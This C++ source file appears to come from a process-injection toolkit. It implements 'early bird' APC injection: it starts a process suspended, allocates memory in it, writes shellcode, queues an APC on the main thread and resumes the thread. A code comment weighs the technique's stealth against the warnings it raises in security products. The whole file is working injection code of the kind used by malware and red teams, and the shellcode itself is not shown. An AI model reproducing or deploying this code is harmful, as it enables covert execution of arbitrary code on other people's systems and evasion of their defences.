#include <cstdio>

#include "sysapi.h"
#include "scripts.h"

namespace scripts {

bool inject_queue_apc_early_bird(const std::wstring& original_image,
                                 RemoteProcessMemoryMethod memory_method) {

    wprintf(L"\nPreparing a new process\n");

    wprintf(L"  [*] creating process...\n");

    auto process = sysapi::ProcessCreateUser(original_image, true);
    if (process.hProcess == NULL) {
        return false;
    }

    wprintf(L"\nPlacing shellcode in the target process\n");

    RemoteProcessMemoryContext ctx;
    ctx.method = memory_method;
    ctx.ProcessHandle = process.hProcess.get();
    ctx.Size = (ULONG)default_shellcode_size;

    bool res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    wprintf(L"  [*] writing shellcode...\n");

    res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
    if (!res) {
        return false;
    }

    wprintf(L"\nQueueing APC with shellcode in main thread\n");

    res = sysapi::ThreadQueueUserApc(process.hThread.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
    if (!res) {
        return false;
    }

    wprintf(L"  [+] APC queued, HANDLE = 0x%p\n", process.hThread.get());

    // NOTE:
    // The main advantage of running a suspended process is executing shellcode via APC at the process initialization stage
    // so we don't need to search an alertable thread, APC will be executed immediately
    // On the other hand, running a suspended process and resuming threads are red flags for security solutions
    // but without suspension it will be a regular APC injection (but into a newly started process)
    // TODO: maybe add a strategy selection option and/or merge this script with the regular APC injection script

    wprintf(L"  [*] resuming thread...\n");

    if (!ResumeThread(process.hThread.get())) {
        return false;
    }

    wprintf(L"\nSuccess\n");
    return true;
}

}